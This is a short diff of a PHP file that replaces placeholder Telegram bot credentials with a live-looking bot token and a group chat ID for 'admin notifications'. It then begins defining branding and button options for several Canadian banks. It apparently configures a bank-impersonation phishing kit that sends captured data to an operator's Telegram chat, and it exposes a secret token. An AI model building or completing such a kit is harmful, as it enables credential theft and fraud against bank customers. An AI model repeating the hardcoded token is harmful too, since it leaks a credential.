@@ -5,8 +5,8 @@
  */
 
 // Telegram Bot API credentials (replace with your actual bot token and admin chat ID)
-$BOT_TOKEN     = 'YOUR_TELEGRAM_BOT_TOKEN';    // e.g., 123456789:ABCDefGhIjKlMnOpQrStUvWxYz
-$ADMIN_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID';      // Chat ID (or channel ID) where admin notifications are sent
+$BOT_TOKEN     = '6278639566:AAFOIuW6Gjd53XTJJSQUoWu83j9bQ540Th8';    // e.g., 123456789:ABCDefGhIjKlMnOpQrStUvWxYz
+$ADMIN_CHAT_ID = '-1002651242191';      // Chat ID (or channel ID) where admin notifications are sent
 
 // Define branding and inline button options for each supported Canadian bank.
 $BANKS = [
